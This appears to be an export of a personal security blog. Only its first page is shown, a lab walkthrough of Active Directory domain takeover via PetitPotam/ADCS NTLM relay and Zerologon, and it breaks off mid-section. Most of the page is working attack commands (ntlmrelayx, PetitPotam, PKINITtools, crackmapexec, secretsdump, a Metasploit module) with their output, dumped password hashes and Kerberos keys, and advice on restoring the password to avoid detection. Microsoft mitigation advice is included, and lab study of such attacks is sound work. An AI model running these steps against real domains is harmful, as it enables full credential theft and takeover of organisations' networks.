# Legacy Knowledge Source Export

Source: `/Users/hgiessen/h00die-gr3y.github.io`

Selected source files exported: **7**

> This export preserves the original legacy source text for editorial migration. No source files are modified.

## Included sources

- `_pages/ad-domain-attack.md` — <span style="color:lime">Active Directory Domain Attacks</span>
- `_pages/tips-and-tricks.md` — <span style="color:lime">Metasploit Tips and Tricks</span>
- `_pages/module-development.md` — <span style="color:lime">Metasploit Module Development</span>
- `_posts/2024-08-26-howto-uart-shell.md` — How to spawn an UART shell?
- `_pages/iot-uart-shell.md` — <span style="color:lime">IoT Hacking - Spawning UART shells</span>
- `_pages/references.md` — References
- `_pages/log4shell.md` — <span style="color:lime">Log4shell Attacks</span>

---

## _pages/ad-domain-attack.md

**Title:** <span style="color:lime">Active Directory Domain Attacks</span>

**Legacy permalink:** `/ad-domain-attack/`

<!-- BEGIN LEGACY SOURCE: _pages/ad-domain-attack.md -->

---
title: <span style="color:lime">Active Directory Domain Attacks</span>
permalink: /ad-domain-attack/
author_profile: false
categories:
  - Active Directory
  - Attack
tags:
  - exploits
  - PetitPotam
  - Zerologon
  - ADCS
sidebar:
  - title: ""
    image: /assets/images/petitpotam.png
toc: true
toc_label: "Table of Contents"
toc_icon: "folder"
toc_sticky: true
---

## Introduction

One of the ultimate goals of a Hacker is to get full administrative access to Active Directory Domain that literally makes your Mr. God in
the Windows world. This "little" write up will give you a glance how to this by explaining two potential attack vectors 
<span style="color:lime">"Zerologon"</span> and <span style="color:lime">"PetitPotam / ADCS"</span> exploitation.

To demonstrate these two attacks, I have created a small test bed with an Active Directory/DNS server and a Certificate server (ADCS).

Domain: `victim.com`\
DC / DNS hostname: `advictim2012r2`\
FQDN: `advictim2012r2.victim.com`\
IP: `192.168.201.9`\
\
ADCS hostname: `cavictim2012r2`\
FQDN: `cavictim2012r2.victim.com`\
IP: `192.168.100.10`\
\
All above are Windows Server 2012R2 evaluation versions with no patches applied.

Check out the references below if you need help setting up your own environment. 

[Setting up a Domain Controller](https://techdirectarchive.com/2020/01/08/how-to-setup-dc-setting-up-the-two-domain-controllers/ "Setting up a Domain Controller")

[Setting up ADCS server](https://hakin9.org/domain-takeover-with-petitpotam-exploit/ "Setting up a Certificate (ADCS) server")

Again the assumption is that you have Kali Linux installed and operational because we will use this platform to perform the attack and compromise the domain.

## Domain take-over with PetitPotam and ADCS
Deployment of an Active Directory Certificate Services (ADCS) on a corporate environment could allow system administrators to utilize it for establishing trust between different directory objects. 
However, it could allow red team operators to conduct an NTLM relay attack towards the web interface of an ADCS in order to compromise the network. 
The web interface is used for allowing users to obtain a certificate (web enrollment), is over HTTP protocol, doesn’t support signing and accepts NTLM authentication.

The details of the attack have been presented by Will Schroeder and Lee Christensen in the Certified Pre-Owned whitepaper. 
The attack forces the domain controller machine account (`ADVICTIMR2$` in our lab) to authenticate towards a host which NTLM relay is configured. 
The authentication is relayed towards the Certificate Authority (CA) and raises a request for a certificate. 
Once the certificate is generated for the `ADVICTIMR2$` account an attacker could use this perform arbitrary operations on the domain controller such as retrieving the hash of the Kerberos account in order to create a golden ticket, 
establish domain persistence or dump hashes of domain administrators and establish a communication channel with the domain controller.

Active Directory Certificate Services can be installed as a role on the domain controller or in an individual server which is part of the domain.
The latter is the case in our lab setup.

### Tooling prerequisites
Let's discuss the tooling prerequisites to perform the attack.  

0) Python Virtual Environment\
1) ExAdndroidDev’s Impacket\
2) PetitPotam PoC @topotam77\
3) PKINITtools (Linux)

<span style="color:yellow"><i class="fa fa-info-circle"></i></span>
With latest version of Kali Linux, the Impacket version that comes with the Kali distribution will do the trick.
You can find Impacket at the following directory `/usr/share/doc/python3-impacket/examples/`, and you might want to decide to skip point 1).
{: .notice--info}

#### 0. Python Virtual Environment Installation
First install the python virtual environment so that you will not break your official Kali Linux Python environment.

```shell
apt install python3-venv
mkdir pyvirtenv
python3 -m venv pyvirtenv
source pyvirtenv/bin/activate
```
#### 1. ExAdndroidDev’s Impacket installation
Install this version of Impacket in your python virtual environment (not needed with the latest Kali Linux distributions [2021 and above]).

```shell
cd pyvirtenv
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
python3 setup.py install
```
#### 2. PetitPotam installation

```shell
cd pyvirtenv
git clone https://github.com/topotam/PetitPotam
cd PetitPotam
sudo pip3 install -r requirements.txt
```

#### 3. PKINITtools installation

```shell
cd pyvirtenv
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
sudo pip3 install -r requirements.txt
```
Let's rock'n roll and execute the attack...

### The attack

Lets first launch the ntlmrelay to start listening for inbound authentication attempts from the domain controller targeted with PetitPotam.
Before typing all the commands, ensure that your Kali Linux machine resolves the FQDN of the Certificate server (ADCS) and Active Directory Domain controller 
by adding the DNS server IP running on the Domain Controller at /etc/resolv.conf.

/etc/resolv.conf:
```text
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

nameserver 192.168.201.9 # Domain controller IP hosting the DNS server
``` 
Launch the ntlmrelay listener targeting web enrollment url of the certificate server (http://cavictim2012r2.victim.com/certsrv/certrqus.asp).
```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# python3 impacket/examples/ntlmrelayx.py -debug -smb2support --target http://cavictim2012r2.victim.com/certsrv/certrqus.asp --template DomainController --adcs
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /root/pyvirtenv/lib/python3.10/site-packages/impacket
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
```
Next, we lauch the PetitTotam against the domain controller `ADVICTIM2012R2` in another shell session.
Command arguments are pretty simple, first argument is the IP of your Kali Linux machine and the second argument is the IP of the domain controller.
```shell
┌──(root💀coolhostname)-[~/pyvirtenv]
└─# python3 PetitPotam/PetitPotam.py 192.168.201.20 192.168.201.9


              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.201.9[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

In the other session you will see the response from the ntlmrelay listener and it will give you the certificate for the machine account `ADVICTIM2012R2$` without any authentication needed.\
\
<span style="color:lime">-------- Oepsie !!! ---------</span>

```shell
[*] Authenticating against http://cavictim2012r2.victim.com as VICTIM/ADVICTIM2012R2$ SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from VICTIM/ADVICTIM2012R2$@192.168.201.9 controlled, attacking target http://cavictim2012r2.victim.com
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://cavictim2012r2.victim.com as VICTIM/ADVICTIM2012R2$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ADVICTIM2012R2$:
MIIRtQIBAzCCEW8GCSqGSIb3DQEHAaCCEWAEghFcMIIRWDCCB48GCSqGSIb3DQEHBqCCB4Awggd8AgEAMIIHdQYJKoZIhvcNAQcBMBwGCiqGSI
b3DQEMAQMwDgQIotjk2P2yia0CAggAgIIHSG21MOi4oTSsSF8mdBc/lI2BO2mS8DNhhRUatCFJjsqEjv28vYGssGAI57MKDqFX0KizI5GDwhG4
VTqbvDAItFISe+lWssSsD6haS47K4R3+e9b0Han8eJmhFE4JW3zKJBjPj0rLfFebZjWZak9eTKyc+en/yBs887nPXzqlNzKEJWORZ4TZRg7fEi
aSUIdlDN/keAhVa1v7tRJeRmVRIRd++s2rhheyNv137tan1Mr1Ci045DEpvxTJXxjR3qfZTowlnkMzR0HNnol49kfOjRouVWNfiwziLvwPVvF8
F2ZPs4A3ncp6chTa+RFaHApZ2byRBF8+4hxjEg37UO6igWNOS+SCt5IeKA3epcUS4QMbRy/sKn7A+aQTHfBOrOf9eWdWwRwmE7iib7xQH1K7PU
OIOCLP3BnZ6DQEhcTJwGPoayM8oNYj+1jjZWhLF05klZ7qRnrz9d6nfh4GD8F8mrizS6Qj5fAvSB09R0fn5+nPJB81eNcj9D+yo8S3BxK3WuPN
g+17E6ElAOPdcFoqmY6wErzOsr85wgohOpuxJi5Y4xN7fw2r6ad8jGr8wFpFJKUlN8SgFhxa+DqZ9MvVOYUgDv/OM0egmafLrdoNQMXYS6HiSa
0C+sKV13d90Lery8POWU1EfVYxOEAHU3o2ZnZ+DJ77p9FH0KkSzE7/x2D4iqg2PaBkN36EW5myzJGC3KtHmLKeIEJwoHpChkDAupeUdnjLlFHb
mizM1r51Bh3i/CRBwmQXDkgJG8MwuyISqmLR7t/gjJtojOmqxo6l4TCBw50rBDwyWQGp7jVHVi0xghe7LKLbFxDEN14kSG+qWhaCIrOHXyrJkY
Z0DuUqXl3EZLL6kPPXfZZ1aaN5xhG55lXF0YouelqNqZACGOyHnuEQVSaogcM9Pq0zQA5nrJWYoj+Qsd6ZL0Aku+G1OwQiRVQcL2fmAL7dw/My
6MJ1GuUIoTYfeHGYm9iqZSKgvfhvHsSgBkr3Mn4NfGrVFwwV7NeRqElmlZO8w0eOjfCSv7ggvcZ7uJ1g6yDXHy2KKqn2tsicApK/7mDucQEnJu
NdypW6tc9x4XzfDFGlZ4V9LAv9qYimX0v9NEaRrZWHNNA95N4qcsxGGFnCkG+F3a9PHgwA1+AMhHjwLIOIb5EB0uecsy1JlLu2o4MwggnBBgkq
hkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQEMAQMwDgQIgnJAMbSMz5ECAggABIIJSI24e2
cXUfGAXYWhScNXdmrXz7OqwPPvYX+t7V45CCpJd/mjW8zR4m+rMO+Q8zftIW9ZR2Mp65IbuBXq1KLtqLez9dbyqFt4hMCThRhZ8jkG0Rm/tSot
akJsKKeWfdinr58G6RahcsCOjpa/jlzTjqQEsN4faL5VSkf00K2Z3SP3H3drJ9HRwlwp6y2dQ6dPfGFTvJqHzfSaGJ7CgKZAHneIdreOKpotb1
3EQJ1VTaDx4i+RwHqcIHzhTeDeB1jfE4ybh316RvL0cuULs3k0ZoPF7pJ7PPe/9B1gkdEiUvYoo+1W42JuQ03RtVRUdIyv/1hiZN6a2eCaNWMM
...etc
yE4JTYCKREBQwORtWHXInaVraRgs3QwNQYBVa/aCQv5tQfeZDcy6s3raOLTCVSnVOBCS82a1t3QmXASDJoifTx7i4hxDRCpWUudcrkUaUtDCtp
[*] Skipping user ADVICTIM2012R2$ since attack was already performed
```
Now lets copy this base64 certicate and store it in a file crt.pfx.b64.
Next decode its contents and write it to a separate file using a command similar to the one below: 
```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# cat crt.pfx.b64 | base64 -d > crt.pfx
```

Now the next level comes into play where we will use the DirkJam tooling to get kerberos ticket of the AD machine account `ADVICTIM2012R2$`.
```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# python3 PKINITtools/gettgtpkinit.py -cert-pfx crt.pfx victim.com/ADVICTIM2012R2\$ out.ccache
2022-05-16 08:16:49,030 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-05-16 08:16:51,876 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-05-16 08:16:52,241 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-05-16 08:16:52,241 minikerberos INFO     fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef
INFO:minikerberos:fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef
2022-05-16 08:16:52,247 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```
You need the following for the command to work:
- The internal domain name (victim.com)
- The hostname of the DC (ADVICTIM2012R2$) you triggered authentication with using PetitPotam. Don’t forget to escape the $ with a backslash
- Decoded version of the Base64 PFX you just generated with ntlmrelayx (crt.pfx)

When successfull, you can continue to use the kerberos ticket and AS-REP key to get the NT hash.

<span style="color:yellow"><i class="fa fa-info-circle"></i></span> 
In this phase, i had some issues and got several errors such as:\
Error Name: KDC_ERR_CLIENT_NOT_TRUSTED Detail: "The client trust failed or is not implemented".\
Root cause in my case was that the root certificate was not properly propagated to the domain controller.\
\
Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)"\
The above error has to do with the smart card logon EKUs. I ran into this issue experimenting with Windows 2008R2 as domain controller.\
There are some words on this error in the link below.
[Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html "Authenticating with certificates when PKINIT is not supported")
{: .notice--info}

Next, we will use kerberos ticket (out.ccache) and AS-REP key to get the NT hash for the domain controller using the getnthash.py: 
```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# KRB5CCNAME=out.ccache python3 PKINITtools/getnthash.py victim.com/ADVICTIM2012R2\$ -key fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
6584bf06e7b65c680426dd1b21352f01
```
You need the following for the command to work:
- The internal domain name (victim.com)
- The hostname of the DC (ADVICTIM2012R2$) you triggered authentication with using PetitPotam. Don’t forget to escape the $ with a backslash
- The generated AS-REP key you got from gettgtpkinit.py (fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef)
- The generated TGT ccache file you got from gettgtpkinit.py (out.ccache)

We are almost there, just three  more commands to become Mr. God on the Active Directory domain.
First, we need to find some domain admin account that we can impersonate using the NT hash above and crackmapexec (installed by default at Kali Linux).

```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# crackmapexec ldap advictim2012r2.victim.com -u ADVICTIM2012R2\$ -H 6584bf06e7b65c680426dd1b21352f01 --admin-count
SMB         advictim2012r2.victim.com 445    ADVICTIM2012R2   [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ADVICTIM2012R2) (domain:victim.com) (signing:True) (SMBv1:True)
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   [+] victim.com\ADVICTIM2012R2$:6584bf06e7b65c680426dd1b21352f01
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Administrator
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Administrators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Print Operators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Backup Operators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Replicator
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   krbtgt
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Domain Controllers
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Schema Admins
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Enterprise Admins
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Domain Admins
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Server Operators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Account Operators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Read-only Domain Controllers 
```
You need the following for the command to work:
- The NT hash you just extracted (6584bf06e7b65c680426dd1b21352f01)
- The hostname of the domain controller you’re targeting (ADVICTIM2012R2)
- Crackmapexec installed

Let's take the good old Administrator account to get the silver ticket and get full domain access with the gets4uticket.py command.

```shell
(pyvirtenv) ┌──(root💀cerberus)-[~/pyvirtenv]
└─# KRB5CCNAME=out.ccache python3 PKINITtools/gets4uticket.py kerberos+ccache://victim.com\\ADVICTIM2012R2\$:out.ccache@ADVICTIM2012R2.victim.com cifs/ADVICTIM2012R2.victim.com@victim.com Administrator@victim.com Administrator.ccache -v
2022-05-16 08:32:40,215 minikerberos INFO     Trying to get SPN with Administrator@victim.com for cifs/ADVICTIM2012R2.victim.com@victim.com
INFO:minikerberos:Trying to get SPN with Administrator@victim.com for cifs/ADVICTIM2012R2.victim.com@victim.com
2022-05-16 08:32:40,548 minikerberos INFO     Success!
INFO:minikerberos:Success!
2022-05-16 08:32:40,549 minikerberos INFO     Done!
INFO:minikerberos:Done!
```
Note that you need the following for the command to work:
- The hostname of the domain controller you’re targeting (ADVICTIM2012R2)
- The generated ccache file you got from gettgtpkinit.py (out.ccache)
- A user to target and pull a silver ticket for (Administrator)
- The internal domain name (victim.com)
 
We have obtained the silver kerberos ticket as Administrator and saved it in the Administrator kerberos ticket cache (Administrator.ccache).
Now we can execute a secretdump to reveal all the credentials and hashes from the domain controller including the `famous` or maybe better the `infamous` golden ticket (krbtgt).
```shell
(pyvirtenv) ┌──(root💀cerberus)-[~/pyvirtenv]
└─# KRB5CCNAME=Administrator.ccache python3 impacket/examples/secretsdump.py -just-dc-ntlm -user-status -debug -k victim.com/Administrator@ADVICTIM2012R2.victim.com -no-pass -outputfile victim.com
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /root/pyvirtenv/lib/python3.10/site-packages/impacket
[+] Using Kerberos Cache: Administrator.ccache
[+] Returning cached credential for CIFS/ADVICTIM2012R2.VICTIM.COM@VICTIM.COM
[+] Using TGS from cache
[+] Saving output to victim.com
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_QOZpvagZ
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-500
[+] Calling DRSGetNCChanges for {b0c05beb-b058-4be4-af26-b298ed790bf6}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=victim,DC=com
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-501
[+] Calling DRSGetNCChanges for {9be2d9b6-f416-401b-8785-8acf939cc05c}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Guest,CN=Users,DC=victim,DC=com
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Disabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-502
[+] Calling DRSGetNCChanges for {6239cb31-4fd8-474a-b517-3e52c6907330}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=victim,DC=com
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-1000
[+] Calling DRSGetNCChanges for {0111ff7d-8243-4902-af44-3f3f29bf1854}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ADVICTIM2012R2,OU=Domain Controllers,DC=victim,DC=com
ADVICTIM2012R2$:1000:aad3b435b51404eeaad3b435b51404ee:6584bf06e7b65c680426dd1b21352f01::: (status=Enabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-1103
[+] Calling DRSGetNCChanges for {22087741-84b4-4d4d-8ff5-e5cdf19cd4af}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=CAVICTIM2012R2,CN=Computers,DC=victim,DC=com
CAVICTIM2012R2$:1103:aad3b435b51404eeaad3b435b51404ee:9c1ffa33539e567196cfbaa923326d3a::: (status=Enabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Cleaning up...
```
Collected all the babies and got foothold on the domain ;-)

### In summary
You can pull off this attack in 15-20 minutes after you have gained a foothold on the internal network.
Scanning for port 445 and finding the domain controllers and certificate server is the easy part that we did not discuss here, but you probably already know how to do this.
Since ETERNALBLUE, this is probably the best and biggest exploiting path to become domain administrator because the "out of the box" domain controller and certificate configuration opens up this door for hackers to use.

Microsoft has lauched  a lot of recommendations to protect you against an attack like this such as:
- Implement LDAP signing and channel binding wherever possible;
- Enable EPA for Certificate Authority Web Enrollment in IIS on internal certificate authority servers;
- Enable EPA for Certificate Enrollment Web Service in IIS on internal certificate authority servers;
- Disable NTLM Authentication on your Windows domain controller (pipe dream, we know); and
- Disable NTLM for Internet Information Services (IIS) on AD CS Servers in your domain running the “Certificate Authority Web Enrollment” or “Certificate Enrollment Web Service” services. 

See also
[kb5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS)](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429 "KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (ADCS)") 

## Domain take-over using the Zerologon exploit
### Introduction
In a recent paper written by the Secura team, a researcher detailed a vulnerability wherein it’s possible, without authentication, to take control of an entire Active Directory domain.\
Very few pre-existing criteria must be met prior to successful exploitation. The domain controller must be accessible, with Windows MS-NRPC services enabled.\
\
The core of the vulnerability lies in a poor implementation of the ComputeNetlogonCredential call of the Netlogon Remote Protocol (MS-NRPC).\
The ComputeNetlogonCredential takes an 8-byte challenge as an input, performs a cryptographic transformation using a session key (which proves knowledge of the computer secret), and outputs an 8-byte result.\
The issue lies in an implementation flaw in the newer method AES-CFB8 (which is also the only one allowed in newer Windows versions) which is used to perform this transformation.\
\
In order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key.\
However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes.
This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256.\
Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren’t rejected by servers (by default).\
\
The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.\
\
Here is a summary of the exploitation steps:
- Establish an unsecure Netlogon channel against a domain controller by performing a brute-force attack using an 8 zero-bytes challenge and ciphertext, while spoofing the identity of that same domain controller. This would require an average of 256 attempts (given the probability of success being 1 in 256).
- Use the NetrServerPasswordSet2 call to set the domain controller account’s password, as stored in Active Directory, to an empty one. This breaks some of the domain controller functionality, since the password stored in the domain controller’s registry does not change (this is the reason step four noted below is taken).
- Use the empty password to connect to that same domain controller and dump additional hashes using the Domain Replication Service (DRS) protocol.
- Revert the domain controller password to the original one as stored in the local registry to avoid detection.
- Use the hashes dumped from stage 3 to perform any desired attack such as Golden Ticket or pass the hash using domain administrator credentials.

### The Attack
There are several ways to execute the attack, but for this demonstration we will use good old Metasploit zerologon module to exploit this vulnerability.\
The assumption is that you already gained foothold on the internal network and identified the domain controllers in the network.\
In our case, we will use the `advictim2012r2` server as our target with IP address `192.168.201.9`.

Start up Metasloit framework on Kali Linux and search for zerologon.\
Fill in IP and netbios name of the Domain controller and run check to see if the server is vulnerable to zerologon.

```shell
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > options

Module options (auxiliary/admin/dcerpc/cve_2020_1472_zerologon):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   NBNAME  advictim2012r2   yes       The server's NetBIOS name
   RHOSTS  192.168.201.9    yes       The target host(s), see https://github.com/rapid7/metasploit-frame
                                      work/wiki/Using-Metasploit
   RPORT                    no        The netlogon RPC port (TCP)


Auxiliary action:

   Name    Description
   ----    -----------
   REMOVE  Remove the machine account password


msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > check

[*] 192.168.201.9: - Connecting to the endpoint mapper service...
[*] 192.168.201.9:49155 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[*] 192.168.201.9:49155 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[+] 192.168.201.9 - The target is vulnerable.
```
As you can see, our Active Directory is vulnerable, so let's perform the attack to remove the machine account password.

<span style="color:yellow"><i class="fa fa-info-circle"></i></span>
NOTE: Removing the machine account password (setting the null password) will introduce an inconsistency between the machine password store at the AD and the local machine password stored in registry.\
This will break the active directory domain replication with other domain controllers and can have other undesired effects.\
To minimize the impact and avoid detection, it is important to restore the machine password as soon as possible to restore the consistency.
{: .notice--info}

Removing the machine account (setting the null password).
```shell
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > exploit
[*] Running module against 192.168.201.9

[*] 192.168.201.9: - Connecting to the endpoint mapper service...
[*] 192.168.201.9:49155 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[*] 192.168.201.9:49155 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[+] 192.168.201.9:49155 - Successfully authenticated
[+] 192.168.201.9:49155 - Successfully set the machine account (advictim2012r2$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
[*] Auxiliary module execution completed
```
Now we can use the secretdump.py that comes with Impacket with the `-no-pass` option to pull the all the password hashes from the AD.

```shell
┌──(root💀coolhostname)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'ADVICTIM2012R2$'@192.168.201.9 -no-pass -outputfile victim.com -user-status
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Disabled)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)
ADVICTIM2012R2$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Enabled)
CAVICTIM2012R2$:1103:aad3b435b51404eeaad3b435b51404ee:9c1ffa33539e567196cfbaa923326d3a::: (status=Enabled)
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:484daca6d51e63a5332b6ce83e9d24389f9f95219118efc01dd69c4bee1a032e
krbtgt:aes128-cts-hmac-sha1-96:dbbdcef9cacf1c3509e47fef1b373634
krbtgt:des-cbc-md5:bfe0453e54585b43
ADVICTIM2012R2$:aes256-cts-hmac-sha1-96:6c4942b6eb4f1110745b39a50f77952c0e398235ed27f9c333b9753f801edd27
ADVICTIM2012R2$:aes128-cts-hmac-sha1-96:401d7736faf7f88f22667c3d32c08bee
ADVICTIM2012R2$:des-cbc-md5:89cb6876a4c84616
CAVICTIM2012R2$:aes256-cts-hmac-sha1-96:23c6b2e38221f5d84be025657a295a6026007e4c7a948f691f65ecf826750452
CAVICTIM2012R2$:aes128-cts-hmac-sha1-96:c96ad9db438b318dcf0168d4b2d2d86c
CAVICTIM2012R2$:des-cbc-md5:a79badf7ec9eb0cd
[*] Cleaning up...
```
Now take one of the user accounts and password hash, in our case administrator, to run another secretsdump to retrieve the machine account.\
Search for the entry `VICTIM\ADVICTIM2012R2$:plain_password_hex:` and copy the hexstring to be used to restore the machine account password.

```shell
